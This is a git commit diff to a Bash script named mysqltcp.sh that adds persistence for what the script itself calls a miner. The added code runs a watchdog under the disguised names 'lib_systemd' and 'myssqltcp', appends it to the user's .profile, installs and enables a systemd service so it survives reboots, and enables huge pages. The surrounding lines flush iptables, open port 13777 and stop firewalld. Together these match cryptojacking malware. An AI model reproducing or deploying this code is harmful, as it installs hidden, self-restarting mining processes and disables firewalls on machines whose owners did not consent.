2a0eb880707c751e70cfc8267818ee4e4598b219
U8Pool <905353149@qq.com>
2023-01-30 01:55:33 +0800

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -764,8 +764,6 @@ chmod 777 $HOME/myssqltcp/Tcphost.sh
 echo "[*] Creating $HOME/myssqltcp/lib_systemd.sh script"
 cat >$HOME/myssqltcp/lib_systemd.sh <<EOL
 #!/bin/bash
-export LD_LIBRARY_PATH=$HOME/myssqltcp/
-
 while true; do
         server=`ps aux | grep MyssqlTcp | grep -v grep`
         if [ ! "$server" ]; then
@@ -1463,11 +1461,8 @@ echo ""
 cd /$HOME/
 rm -f index.html
 sudo /bin/bash ./delserver.sh >/dev/null 2>&1 &
-sudo /bin/bash .$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 &
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
-/bin/bash .$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 &
 nohup ./delserver.sh >/dev/null 2>&1 &
-nohup .$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
 
 iptables -F
 iptables -X
@@ -1479,5 +1474,56 @@ iptables -A INPUT -p tcp –dport 13777 -j ACCEPT
 iptables -A OUTPUT -j ACCEPT 
 service iptables reload
 systemctl stop firewalld.service
+
+# preparing script background work and work under reboot
+
+if ! sudo -n true 2>/dev/null; then
+  if ! grep myssqltcp/lib_systemd.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/myssqltcp/lib_systemd.sh script to $HOME/.profile"
+    echo "$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1" >>$HOME/.profile
+  else 
+    echo "Looks like $HOME/myssqltcp/lib_systemd.sh script is already in the $HOME/.profile"
+  fi
+  echo "[*] Running miner in the background (see logs in $HOME/myssqltcp/lib_systemdig.log file)"
+  /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
+else
+
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
+    echo "[*] Enabling huge pages"
+    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
+    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+  fi
+
+  if ! type systemctl >/dev/null; then
+
+    echo "[*] Running miner in the background (see logs in $HOME/myssqltcp/lib_systemd.log file)"
+    /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
+    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
+    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+
+  else
+
+    echo "[*] Creating lib_systemd systemd service"
+    cat >/tmp/lib_systemd.service <<EOL
+[Unit]
+Description=lib_systemd service
+[Service]
+ExecStart=$HOME/myssqltcp/lib_systemd.sh
+Restart=always
+Nice=10
+CPUWeight=1
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /tmp/lib_systemd.service /etc/systemd/system/lib_systemd.service
+    echo "[*] Starting lib_systemd systemd service"
+    sudo killall lib_systemd 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable lib_systemd.service
+    sudo systemctl start lib_systemd.service
+    echo "To see miner service logs run \"sudo journalctl -u lib_systemd -f\" command"
+  fi
+fi
+
 
 echo "[*] Yes-GoGo"
